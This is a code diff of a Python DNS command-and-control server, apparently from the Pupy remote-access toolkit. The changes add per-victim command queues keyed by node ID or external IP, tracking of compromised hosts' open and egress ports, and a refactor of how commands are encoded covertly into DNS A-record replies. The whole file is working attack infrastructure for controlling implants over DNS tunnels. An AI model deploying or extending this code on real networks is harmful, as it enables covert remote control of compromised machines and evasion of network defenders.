@@ -1,5 +1,16 @@
 # -*- coding: utf-8 -*-
 
+__all__ = (
+    'convert_node',
+    'Session',
+    'DnsCommandServerHandler',
+    'DnsCommandServer',
+
+    'DnsNoCommandServerException',
+    'DnsPingRequest',
+    'DnsCommandServerException',
+)
+
 import copy
 import struct
 import random
@@ -7,22 +18,37 @@ import base64
 import time
 
 import zlib
-import ascii85
 import hashlib
 
 import functools
 import logging
 
+try:
+    from pupylib import getLogger
+    logger = getLogger('dnscnc')
+except:
+    logger = logging.getLogger('dnscnc')
+
 import socket
 import socketserver
+import binascii
+import netaddr
+
+from threading import Thread, RLock, Event
 
 from dnslib import DNSRecord, RR, QTYPE, A, RCODE
 from dnslib.server import DNSServer, DNSHandler, BaseResolver, DNSLogger
 
+import ascii85
+
 from picocmd import *
 from ecpv import ECPV
 
-from threading import Thread, RLock, Event
+def convert_node(node):
+    try:
+        return str(netaddr.IPAddress(node))
+    except:
+        return int(node, 16)
 
 class Session(object):
     def __init__(self, spi, encoder, commands, timeout):
@@ -33,9 +59,14 @@ class Session(object):
         self._timeout = timeout
         self.system_info = None
         self.system_status = None
+        self.online_status = None
+        self.open_ports = {}
+        self.egress_ports = set()
         self.commands = commands
         self.last_nonce = None
         self.last_qname = None
+        self.pstore_dirty = False
+        self.connecteed = False
         self.cache = {}
 
     @property
@@ -66,7 +97,7 @@ class Session(object):
             self.commands.append(command)
 
     def __repr__(self):
-        return '{{SESSION {:08x}{}}}'.format(
+        return '{{SESSION {:08x} {}}}'.format(
             self.spi, self.system_info or ''
         )
 
@@ -85,8 +116,11 @@ class DnsCommandServerException(Exception):
     def error(self):
         return Error(self.message)
 
-    def __repr__(self):
+    def __str__(self):
         return str(self.error)
+
+    def __repr__(self):
+        return repr(self.error)
 
 class DnsCommandServerHandler(BaseResolver):
     def __init__(self, domain, key, recursor=None, timeout=None):
@@ -110,6 +144,7 @@ class DnsCommandServerHandler(BaseResolver):
         self.kex = True
         self.timeout = timeout or self.interval*3
         self.commands = []
+        self.node_commands = {}
         self.lock = RLock()
         self.finished = Event()
 
@@ -121,6 +156,7 @@ class DnsCommandServerHandler(BaseResolver):
                     if session.idle > self.timeout:
                         to_remove.append(spi)
                 for spi in to_remove:
+                    self.on_session_cleaned_up(self.sessions[spi])
                     del self.sessions[spi]
 
                 self.cache = {}
@@ -136,6 +172,23 @@ class DnsCommandServerHandler(BaseResolver):
 
     @locked
     def add_command(self, command, session=None, default=False):
+        if default and session:
+            nodes = session
+            if type(nodes) in (str,unicode):
+                nodes = [ convert_node(x) for x in nodes.split(',') ]
+            elif type(nodes) == int:
+                nodes = [ nodes ]
+
+            idx = 0
+            for node in nodes:
+                if not node in self.node_commands:
+                    self.node_commands[node] = []
+
+                self.node_commands[node].append(command)
+                idx += 1
+
+            return idx
+
         if default:
             self.commands.append(command)
 
@@ -166,6 +219,21 @@ class DnsCommandServerHandler(BaseResolver):
 
     @locked
     def reset_commands(self, session=None, default=False):
+        if default and session:
+            nodes = session
+            if type(nodes) in (str,unicode):
+                nodes = [ convert_node(x) for x in nodes.split(',') ]
+            elif type(nodes) == int:
+                nodes = [ nodes ]
+
+            idx = 0
+            for node in nodes:
+                if node in self.node_commands:
+                    del self.node_commands[node]
+                    idx += 1
+
+            return idx
+
         if default:
             self.commands = []
 
@@ -204,7 +272,7 @@ class DnsCommandServerHandler(BaseResolver):
 
         if node:
             if type(node) in (str,unicode):
-                node = [ int(x, 16) for x in node.split(',') ]
+                node = [ convert_node(x) for x in node.split(',') ]
             elif type(node) == int:
                 node = [ node ]
 
@@ -221,7 +289,8 @@ class DnsCommandServerHandler(BaseResolver):
             return [
                 session for session in self.sessions.itervalues() \
                     if session.system_info and \
-                        session.system_info['node'] in set(node)
+                        ( session.system_info['node'] in set(node)
+                              or str(session.system_info['external_ip']) in set(node) )
             ]
 
     @locked
@@ -283,6 +352,12 @@ class DnsCommandServerHandler(BaseResolver):
     def on_exit(self, info):
         pass
 
+    def on_new_session(self, session):
+        pass
+
+    def on_session_cleaned_up(self, session):
+        pass
+
     def _a_page_encoder(self, data, encoder, nonce):
         data = encoder.encode(data, nonce, symmetric=encoder.kex_completed)
 
@@ -299,13 +374,12 @@ class DnsCommandServerHandler(BaseResolver):
             idx = idx << 25
             bits = ( struct.unpack('>I', '\x00'+part+chr(random.randrange(0, 255))*(3-len(part)))[0] ) << 1
             packed = struct.unpack('!BBBB', struct.pack('>I', header | idx | bits | int(not bool(bits & 6))))
-            address = '.'.join(['{}'.format(int(x)) for x in packed])
-            response.append(RR('.', QTYPE.A, rdata=A(address), ttl=600))
+            response.append('.'.join(['{}'.format(int(x)) for x in packed]))
 
         return response
 
     def _q_page_decoder(self, data):
-        parts = data.stripSuffix(self.domain).idna()[:-1].split('.')
+        parts = data.split('.')
 
         if len(parts) == 0:
             raise DnsPingRequest(1)
@@ -344,13 +418,24 @@ class DnsCommandServerHandler(BaseResolver):
 
 
     def _cmd_processor(self, command, session):
-        logging.debug('dnscnc:commands={} session={}'.format(command, session))
+        logger.debug('command={}/{} session={} / node commands={}'.format(
+            command, type(command).__name__,
+            '{:08x}'.format(session.spi) if session else None,
+            bool(self.node_commands)))
 
         if isinstance(command, Poll) and session is None:
-            return [Policy(self.interval, self.kex), Poll()]
+            if not self.kex:
+                if self.node_commands and not self.commands:
+                    return [Policy(self.interval, self.kex), Poll()]
+                elif self.commands:
+                    return self.commands
+                else:
+                    return [Policy(self.interval, self.kex)]
+            else:
+                return [Policy(self.interval, self.kex), Poll()]
 
         elif isinstance(command, Ack) and (session is None):
-            return [Ack()]
+            pass
 
         elif isinstance(command, Exit):
             if session and session.system_info:
@@ -373,19 +458,51 @@ class DnsCommandServerHandler(BaseResolver):
             commands = session.commands
             return commands
 
+        elif isinstance(command, SystemInfo) and self.node_commands:
+            node = command.node
+            extip = str(command.external_ip)
+
+            logger.debug('SystemStatus + No session + node_commands: {}/{} in {}?'.format(
+                node, extip, self.node_commands.keys()))
+
+            if node in self.node_commands:
+                return self.node_commands[node]
+
+            elif extip in self.node_commands:
+                return self.node_commands[extip]
+
+            logger.debug('SystemStatus + No session + node_commands - not found')
+
+        elif isinstance(command, OnlineStatus) and session is not None:
+            session.online_status = command.get_dict()
+
+        elif isinstance(command, ConnectablePort) and session is not None:
+            if not command.ip in session.open_ports:
+                session.open_ports[command.ip] = set()
+
+            for port in command.ports:
+                session.open_ports[command.ip].add(port)
+
+        elif isinstance(command, PortQuizPort) and session is not None:
+            for port in command.ports:
+                session.egress_ports.add(port)
+
+        elif isinstance(command, PupyState) and session is not None:
+            session.pstore_dirty = command.pstore_dirty
+            session.connected = command.connected
+
         elif isinstance(command, Ack) and (session is not None):
             if session.system_info:
                 self.on_keep_alive(session.system_info)
 
             if command.amount > len(session.commands):
-                logging.info('ACK: invalid amount of commands: {} > {}'.format(
+                logger.debug('ACK: invalid amount of commands: {} > {}'.format(
                     command.amount, len(session.commands)))
             session.commands = session.commands[command.amount:]
-            return [Ack()]
 
         elif isinstance(command, SystemInfo) and session is not None:
             session.system_info = command.get_dict()
-            return [Ack()]
+            self.on_new_session(session)
 
         elif isinstance(command, Kex):
             with self.lock:
@@ -401,17 +518,27 @@ class DnsCommandServerHandler(BaseResolver):
 
                 encoder = self.sessions[command.spi].encoder
                 response, key = encoder.process_kex_request(command.parcel)
-                logging.debug('dnscnc:kex:key={}'.format(binascii.b2a_hex(key[0])))
+                logger.debug('kex:key={}'.format(binascii.b2a_hex(key[0])))
 
             return [Kex(response)]
+        elif isinstance(command, PortQuizPort):
+            logger.debug('portquiz: {}'.format(command))
+        elif isinstance(command, ConnectablePort):
+            logger.debug('connectable: {}'.format(command))
+        elif isinstance(command, OnlineStatus):
+            logger.debug('online-status: {}'.format(command))
+        elif isinstance(command, PupyState):
+            logger.debug('pupy-state'.format())
         else:
             return [Error('NO_POLICY')]
+
+        return [Ack()]
 
     def resolve(self, request, handler):
         if request.q.qtype != QTYPE.A:
             reply = request.reply()
             reply.header.rcode = RCODE.NXDOMAIN
-            logging.debug('Request unknown qtype: {}'.format(QTYPE.get(request.q.qtype)))
+            logger.debug('Request unknown qtype: {}'.format(QTYPE.get(request.q.qtype)))
             return reply
 
         with self.lock:
@@ -426,6 +553,82 @@ class DnsCommandServerHandler(BaseResolver):
             self.cache[part] = response
             return response
 
+    def process(self, qname):
+        responses = []
+
+        session = None
+        nonce = None
+
+        try:
+            request, session, nonce = self._q_page_decoder(qname)
+            if session and session.last_nonce and session.last_qname:
+                if nonce < session.last_nonce:
+                    logger.info('Ignore nonce from past: {} < {}'.format(
+                        nonce, session.last_nonce))
+                    return []
+                elif session.last_nonce == nonce and session.last_qname != qname:
+                    logger.info('Last nonce but different qname: {} != {}'.format(
+                        session.last_qname, qname))
+                    return []
+
+            for command in Parcel.unpack(request):
+                for response in self._cmd_processor(command, session):
+                    responses.append(response)
+
+            if session:
+                session.last_nonce = nonce
+                session.last_qname = qname
+
+        except DnsCommandServerException as e:
+            nonce = e.nonce
+            responses = [e.error, Policy(self.interval, self.kex), Poll()]
+            logger.debug('Server Error: {}'.format(e))
+
+        except ParcelInvalidCrc as e:
+            responses = [e.error]
+            logger.debug('Invalid CRC')
+
+        except DnsNoCommandServerException:
+            logger.debug('No CNC Exception')
+            return None
+
+        except DnsPingRequest, e:
+            replies = []
+            for i in xrange(e.args[0]):
+                x = (i % 65536) >> 8
+                y = i % 256
+                replies.append('127.0.{}.{}'.format(x, y))
+
+            logger.debug('ping request:{}'.format(i))
+            return replies
+
+        except TypeError, e:
+            # Usually - invalid padding
+            if str(e) == 'Incorrect padding':
+                logger.warning('Decoding failed: qname={}'.format(qname))
+            else:
+                logger.exception(e)
+
+            return None
+
+        except Exception as e:
+            logger.exception(e)
+            return None
+
+        logger.debug('responses={} session={}'.format(
+            responses, '{:08x}'.format(session.spi) if session else None))
+
+        encoder = session.encoder if session else self.encoder
+
+        try:
+            payload = Parcel(*responses).pack()
+        except PackError, e:
+            logger.error('Could not create parcel from commands: {} (session={})'.format(
+                e, '{:08x}'.format(session.spi) if session else None))
+            return None
+
+        return self._a_page_encoder(payload, encoder, nonce)
+
     def _resolve(self, request, handler):
         qname = request.q.qname
         reply = request.reply()
@@ -439,76 +642,21 @@ class DnsCommandServerHandler(BaseResolver):
                 except socket.error:
                     pass
                 except Exception as e:
-                    logging.exception('DNS request forwarding failed')
+                    logger.exception('DNS request forwarding failed')
+            else:
+                logger.debug('Bad domain: {} (suffix={})'.format(qname, self.domain))
 
             reply.header.rcode = RCODE.NXDOMAIN
             return reply
 
-        responses = []
 
-        session = None
-        nonce = None
+        arecords = self.process(qname.stripSuffix(self.domain).idna()[:-1])
 
-        try:
-            request, session, nonce = self._q_page_decoder(qname)
-            if session and session.last_nonce and session.last_qname:
-                if nonce < session.last_nonce:
-                    logging.info('Ignore nonce from past: {} < {}'.format(
-                        nonce, session.last_nonce))
-                    reply.header.rcode = RCODE.NXDOMAIN
-                    return reply
-                elif session.last_nonce == nonce and session.last_qname != qname:
-                    logging.info('Last nonce but different qname: {} != {}'.format(
-                        session.last_qname, qname))
-                    reply.header.rcode = RCODE.NXDOMAIN
-                    return reply
-
-            for command in Parcel.unpack(request):
-                for response in self._cmd_processor(command, session):
-                    responses.append(response)
-
-            if session:
-                session.last_nonce = nonce
-                session.last_qname = qname
-
-        except DnsCommandServerException as e:
-            nonce = e.nonce
-            responses = [e.error, Policy(self.interval, self.kex), Poll()]
-
-        except ParcelInvalidCrc as e:
-            responses = [e.error]
-
-        except DnsNoCommandServerException:
+        if arecords:
+            for address in arecords:
+                reply.add_answer(RR(qname, QTYPE.A, rdata=A(address), ttl=600))
+        else:
             reply.header.rcode = RCODE.NXDOMAIN
-            return reply
-
-        except DnsPingRequest, e:
-            for i in xrange(e.args[0]):
-                x = (i % 65536) >> 8
-                y = i % 256
-                a = RR('.', QTYPE.A, rdata=A('127.0.{}.{}'.format(x, y)), ttl=10)
-                a.rname = qname
-                reply.add_answer(a)
-
-            return reply
-
-        except TypeError:
-            # Usually - invalid padding
-            reply.header.rcode = RCODE.NXDOMAIN
-            return reply
-
-        except Exception as e:
-            logging.exception(e)
-            reply.header.rcode = RCODE.NXDOMAIN
-            return reply
-
-        logging.debug('dnscnc:responses={} session={}'.format(responses, session))
-
-        encoder = session.encoder if session else self.encoder
-        for rr in self._a_page_encoder(Parcel(*responses).pack(), encoder, nonce):
-            a = copy.copy(rr)
-            a.rname = qname
-            reply.add_answer(a)
 
         return reply
 
